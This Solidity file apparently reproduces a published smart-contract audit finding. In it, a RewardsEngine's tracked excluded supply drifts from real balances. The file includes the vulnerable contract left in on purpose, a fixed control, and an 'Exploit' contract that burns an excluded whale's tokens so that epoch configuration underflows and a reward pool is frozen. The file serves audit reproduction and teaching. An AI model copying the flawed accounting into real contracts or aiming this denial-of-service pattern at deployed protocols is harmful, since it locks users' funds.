// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Buck Labs / Strong-DAO finding 64666:
// "totalExcludedSupply drifts from reality" (Spearbit, R0bert — High).
//
// RewardsEngine tracks `totalExcludedSupply` as the running sum of the balances
// of excluded accounts. It is updated ONLY inside setAccountExcluded() (and
// setBreakageSink()). Excluded accounts still receive/send the underlying token
// through ordinary transfers, mints and burns, and those changes arrive via the
// token hook onBalanceChange() -> _handleOutflow()/_handleInflow(), which update
// the per-account balance mirror but NEVER adjust totalExcludedSupply. So the
// tracked excluded supply drifts away from reality.
//
// Epoch configuration consumes the stale value verbatim:
//     currentEligibleSupply = IERC20(token_).totalSupply() - totalExcludedSupply;
// When an excluded whale's balance is burned/moved out while the tracked value
// stays high, totalExcludedSupply can EXCEED totalSupply, and this subtraction
// underflows (Solidity 0.8 checked math) → configureEpoch() reverts permanently
// → the epoch can never be configured → the reward pool held by the engine is
// frozen and undistributable. We record that frozen magnitude on a LOCKED marker
// token minted to the SINK.
//
// Negative control (RewardsEngineFixed): the hook path decrements/increments
// totalExcludedSupply for excluded accounts, so configureEpoch() succeeds with
// the correct denominator.
// ─────────────────────────────────────────────────────────────────────────────

interface IRewardsEngine {
    function onBalanceChange(address from, address to, uint256 amount) external;
}

interface IERC20Supply {
    function totalSupply() external view returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal faithful double for the STRX-like underlying token. It is the opaque
// external boundary: it drives the RewardsEngine hook on every balance change
// and tracks totalSupply — exactly what the real token does. It is NOT the
// contract the finding is about.
// ─────────────────────────────────────────────────────────────────────────────
contract HookToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    IRewardsEngine public engine;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function setEngine(address e) external {
        engine = IRewardsEngine(e);
    }

    function _notify(address from, address to, uint256 amount) internal {
        if (address(engine) != address(0)) {
            engine.onBalanceChange(from, to, amount);
        }
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        _notify(address(0), to, amount);
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
        _notify(from, address(0), amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        _notify(msg.sender, to, amount);
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal ERC20 double used ONLY as the reward pool held by the engine and as
// the LOCKED marker. No hook — it is not the excluded-supply-tracked token.
// ─────────────────────────────────────────────────────────────────────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE RewardsEngine. The verbatim vulnerable statements from the finding
// are inlined unchanged:
//   - setAccountExcluded(): `totalExcludedSupply += s.balance;` and the guarded
//     `-=` / `= 0` branch.
//   - onBalanceChange(): the from/to hook dispatch.
//   - configureEpoch(): `currentEligibleSupply = totalSupply() - totalExcludedSupply;`
// The defect is the OMISSION in the hook handlers: they mirror the balance but
// never adjust totalExcludedSupply for excluded accounts.
// ─────────────────────────────────────────────────────────────────────────────
contract RewardsEngine {
    struct AccountState {
        uint256 balance;
        bool excluded;
    }

    address public token;
    mapping(address => AccountState) public accounts;
    uint256 public totalExcludedSupply;
    uint256 public currentEligibleSupply;
    bool public epochConfigured;

    modifier onlyToken() {
        require(msg.sender == token, "only token");
        _;
    }

    constructor(address token_) {
        token = token_;
    }

    // Verbatim setAccountExcluded accounting (admin-gated in prod; gate omitted —
    // it is not the finding's subject).
    function setAccountExcluded(address account, bool isExcluded) external {
        AccountState storage s = accounts[account];
        if (isExcluded) {
            s.excluded = true;
            totalExcludedSupply += s.balance;
        } else {
            s.excluded = false;
            if (totalExcludedSupply >= s.balance) {
                totalExcludedSupply -= s.balance;
            } else {
                totalExcludedSupply = 0;
            }
        }
    }

    // Verbatim onBalanceChange dispatch.
    function onBalanceChange(address from, address to, uint256 amount) external onlyToken {
        if (from != address(0) && from != address(this)) {
            _handleOutflow(from, amount);
        }
        if (to != address(0) && to != address(this)) {
            _handleInflow(to, amount);
        }
    }

    function _handleOutflow(address from, uint256 amount) internal {
        AccountState storage s = accounts[from];
        s.balance -= amount; // @> BUG: excluded-account outflow never decrements totalExcludedSupply -> drift, then underflow DoS
    }

    function _handleInflow(address to, uint256 amount) internal {
        AccountState storage s = accounts[to];
        s.balance += amount; // BUG (mirror): excluded-account inflow never increments totalExcludedSupply
    }

    // Verbatim eligible-supply computation consumed at epoch configuration.
    function configureEpoch() external {
        currentEligibleSupply = IERC20Supply(token).totalSupply() - totalExcludedSupply;
        epochConfigured = true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED RewardsEngine (negative control): the hook handlers keep
// totalExcludedSupply in sync with excluded-account balance changes, matching
// Buck Labs' fix commit 8105ffb.
// ─────────────────────────────────────────────────────────────────────────────
contract RewardsEngineFixed {
    struct AccountState {
        uint256 balance;
        bool excluded;
    }

    address public token;
    mapping(address => AccountState) public accounts;
    uint256 public totalExcludedSupply;
    uint256 public currentEligibleSupply;
    bool public epochConfigured;

    modifier onlyToken() {
        require(msg.sender == token, "only token");
        _;
    }

    constructor(address token_) {
        token = token_;
    }

    function setAccountExcluded(address account, bool isExcluded) external {
        AccountState storage s = accounts[account];
        if (isExcluded) {
            s.excluded = true;
            totalExcludedSupply += s.balance;
        } else {
            s.excluded = false;
            if (totalExcludedSupply >= s.balance) {
                totalExcludedSupply -= s.balance;
            } else {
                totalExcludedSupply = 0;
            }
        }
    }

    function onBalanceChange(address from, address to, uint256 amount) external onlyToken {
        if (from != address(0) && from != address(this)) {
            _handleOutflow(from, amount);
        }
        if (to != address(0) && to != address(this)) {
            _handleInflow(to, amount);
        }
    }

    function _handleOutflow(address from, uint256 amount) internal {
        AccountState storage s = accounts[from];
        if (s.excluded) {
            totalExcludedSupply -= amount; // FIX: keep tracked excluded supply in sync on outflow
        }
        s.balance -= amount;
    }

    function _handleInflow(address to, uint256 amount) internal {
        AccountState storage s = accounts[to];
        if (s.excluded) {
            totalExcludedSupply += amount; // FIX: keep tracked excluded supply in sync on inflow
        }
        s.balance += amount;
    }

    function configureEpoch() external {
        currentEligibleSupply = IERC20Supply(token).totalSupply() - totalExcludedSupply;
        epochConfigured = true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver (cheatcode-free). Runs the BUGGY path:
//   1. mint a whale (large) + a regular holder (small) through the token hook,
//   2. exclude the whale -> totalExcludedSupply = whale balance,
//   3. burn the whale's tokens through the hook: balance mirror drops but
//      totalExcludedSupply stays high AND totalSupply shrinks,
//   4. now totalExcludedSupply > totalSupply -> configureEpoch() underflows,
//   5. the reward pool held by the engine can never be distributed -> LOCKED.
// The frozen reward magnitude is minted on a marker token to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    address internal constant WHALE = 0x0000000000000000000000000000000000000011;
    address internal constant ALICE = 0x0000000000000000000000000000000000000022;

    uint256 internal constant WHALE_BAL = 1_000_000 ether;
    uint256 internal constant ALICE_BAL = 100_000 ether;
    uint256 internal constant REWARD_POOL = 50_000 ether;

    // Exposed results.
    bool public configureReverted;
    uint256 public staleExcludedSupply; // tracked totalExcludedSupply after the drift
    uint256 public liveTotalSupply; // actual token totalSupply after the burn
    uint256 public lockedRewards; // reward pool frozen by the epoch-config DoS
    uint256 public sinkMarkerBalance;
    bool public epochConfiguredFlag; // engine.epochConfigured() after the attack
    address public engineAddr;
    address public tokenAddr;
    address public rewardPoolAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy every contract unconditionally, fixed order (marker LAST) ---
        HookToken token = new HookToken("Strong", "STRX"); // nonce 1
        RewardsEngine engine = new RewardsEngine(address(token)); // nonce 2
        MiniToken rewardPool = new MiniToken("Reward USDC", "rUSDC"); // nonce 3
        MiniToken marker = new MiniToken("Locked Reward USDC", "LOCKED-USDC"); // nonce 4

        engineAddr = address(engine);
        tokenAddr = address(token);
        rewardPoolAddr = address(rewardPool);
        markerAddr = address(marker);

        // wire the token hook to the engine
        token.setEngine(address(engine));

        // fund the reward pool held by the engine (distributed once an epoch is
        // configured — which the DoS makes impossible)
        rewardPool.mint(address(engine), REWARD_POOL);

        // --- populate balances through the real hook path ---
        token.mint(WHALE, WHALE_BAL); // onBalanceChange(0, WHALE) -> mirror = WHALE_BAL
        token.mint(ALICE, ALICE_BAL); // onBalanceChange(0, ALICE) -> mirror = ALICE_BAL
        // totalExcludedSupply == 0 here; totalSupply == 1_100_000 ether

        // --- admin excludes the whale: totalExcludedSupply += whale mirror ---
        engine.setAccountExcluded(WHALE, true); // totalExcludedSupply = WHALE_BAL

        // At this instant configureEpoch would be correct: 1_100_000 - 1_000_000
        // = 100_000 (= ALICE_BAL). The drift is introduced next.

        // --- the excluded whale's tokens are burned via the hook ---
        // _handleOutflow updates the mirror but NOT totalExcludedSupply (the bug),
        // while the token's totalSupply drops.
        token.burn(WHALE, WHALE_BAL);

        staleExcludedSupply = engine.totalExcludedSupply(); // still WHALE_BAL
        liveTotalSupply = token.totalSupply(); // now ALICE_BAL

        // --- harm: totalExcludedSupply (1_000_000) > totalSupply (100_000) ---
        // configureEpoch() underflows and reverts permanently.
        try engine.configureEpoch() {
            configureReverted = false;
        } catch {
            configureReverted = true;
        }
        epochConfiguredFlag = engine.epochConfigured();

        // The reward pool is now permanently frozen: no epoch can be configured,
        // so nothing can ever be distributed. Record the locked magnitude.
        lockedRewards = rewardPool.balanceOf(address(engine));
        require(configureReverted, "expected DoS: configureEpoch must revert");
        require(lockedRewards == REWARD_POOL, "reward pool must be fully locked");

        marker.mint(SINK, lockedRewards);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
